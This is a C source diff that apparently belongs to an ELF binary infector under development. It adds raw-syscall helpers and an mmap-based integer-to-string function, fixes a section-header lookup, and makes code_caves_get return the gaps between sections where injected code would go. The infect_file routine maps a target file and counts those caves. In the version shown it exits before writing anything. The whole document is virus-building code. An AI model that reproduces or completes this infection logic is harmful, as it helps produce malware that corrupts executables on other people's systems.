@@ -1,5 +1,4 @@
 #include "sys/types.h"
-#include "unistd.h"
 #include <stdint.h>
 #include <stdio.h>
 __attribute__((always_inline)) inline long
@@ -70,7 +69,68 @@ __attribute__((always_inline)) inline uint64_t
 ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
     return sys(SYS_mmap, (long)addr, length, prot, flags, fd, offset);
 }
+// Helper: compute number of characters needed (excluding null)
+static size_t
+itoa_needed_digits(int64_t v) {
+    size_t cnt = 0;
+    uint64_t uv;
+    if (v < 0) {
+        cnt++; // for '-'
+        // careful with INT64_MIN
+        uv = (uint64_t)(-(v + 1)) + 1;
+    } else {
+        uv = (uint64_t)v;
+    }
+    do {
+        cnt++;
+        uv /= 10;
+    } while (uv != 0);
+    return cnt;
+}
 
+/**
+ * itoa_alloc: convert signed 64-bit integer to null-terminated decimal string,
+ * allocating via ft_mmap. On error returns NULL and sets errno.
+ *
+ * The returned pointer must be freed by calling ft_munmap(ptr, allocated_size).
+ */
+__attribute__((always_inline)) inline char *
+itoa_alloc(int64_t v) {
+    size_t nd = itoa_needed_digits(v);
+    size_t total = nd + 1; // +1 for '\0'
+    // Align to page size? For simplicity, we just mmap the needed size,
+    // though mmap granularity is page-based under the hood.
+    uint64_t amap = ft_mmap(NULL, total, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if ((intptr_t)amap < 0) {
+        // mmap error: returns (uint64_t)-errno typically via syscall
+        return NULL;
+    }
+    char *buf = (char *)(uintptr_t)amap;
+
+    char *p = buf + nd;
+    *p = '\0';
+    uint64_t uv;
+    if (v < 0) {
+        // handle negative, careful about overflow
+        uv = (uint64_t)(-(v + 1)) + 1;
+    } else {
+        uv = (uint64_t)v;
+    }
+    // fill digits in reverse
+    do {
+        *--p = (char)('0' + (uv % 10));
+        uv /= 10;
+    } while (uv != 0);
+    if (v < 0) {
+        *--p = '-';
+    }
+    // p should now point to buf
+    // sanity check:
+    if (p != buf) {
+        // something went wrong; but we’ll still return buf
+    }
+    return buf;
+}
 __attribute__((always_inline)) inline void *
 ft_malloc(uint64_t size) {
     return (void *)ft_mmap(0, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
@@ -200,7 +260,7 @@ get_next_section_header(uint64_t section_cur_end, file file) {
     Elf64_Shdr *section_header_next = NULL;
 
     for (int i = 0; i < header->e_shnum; i++) {
-        Elf64_Shdr *sh = file.mem + header->e_shoff + header->e_shentsize + i;
+        Elf64_Shdr *sh = file.mem + header->e_shoff + (header->e_shentsize * i);
 
         if (sh->sh_offset >= section_cur_end) {
             if (section_header_next == NULL)
@@ -213,20 +273,31 @@ get_next_section_header(uint64_t section_cur_end, file file) {
 }
 
 __attribute__((always_inline)) inline int
-code_caves_get(volatile code_cave code_caves[], volatile file file) {
+code_caves_get(volatile code_cave code_caves[], volatile file *file) {
     Elf64_Shdr *section_header = NULL;
-    Elf64_Ehdr *header = file.mem;
+    Elf64_Ehdr *header = file->mem;
     uint64_t section_cur_end = header->e_phoff + header->e_phentsize * header->e_phnum;
-
+    uint64_t section_old_end = 0;
+    int i = 0;
     do {
-        section_header = get_next_section_header(section_cur_end, file);
+        section_old_end = section_cur_end;
+        section_header = get_next_section_header(section_cur_end, *file);
         if (section_header != NULL)
             section_cur_end = section_header->sh_offset + section_header->sh_size;
-        else
-            section_cur_end = file.size;
-        printf("anhhhhhhhh %lu\n", section_header->sh_offset);
+        else {
+            code_caves[i].start = section_old_end;
+            code_caves[i].size = file->size - section_old_end;
+            i++;
+            return i;
+        }
+
+        if (section_old_end != section_header->sh_offset && section_header->sh_offset - section_old_end > 16) {
+            code_caves[i].start = section_old_end;
+            code_caves[i].size = section_header->sh_offset - section_old_end;
+            i++;
+        }
     } while (section_header != NULL);
-    return 0;
+    return i;
 }
 
 __attribute__((always_inline)) inline int
@@ -272,9 +343,11 @@ infect_file(char *path) {
 
     prints_str_nl(path);
     volatile file file = file_mmap(fd);
-    code_caves_get(code_caves, file);
-    // get all code caves
+    int num = code_caves_get(code_caves, &file);
+    // for (int i = 0; i < num; i++)
+    //     printf("code start: 0x%lx - size 0x%lx\n", code_caves[i].start, code_caves[i].size);
 
+    ft_exit(num);
     return (0);
 }
 
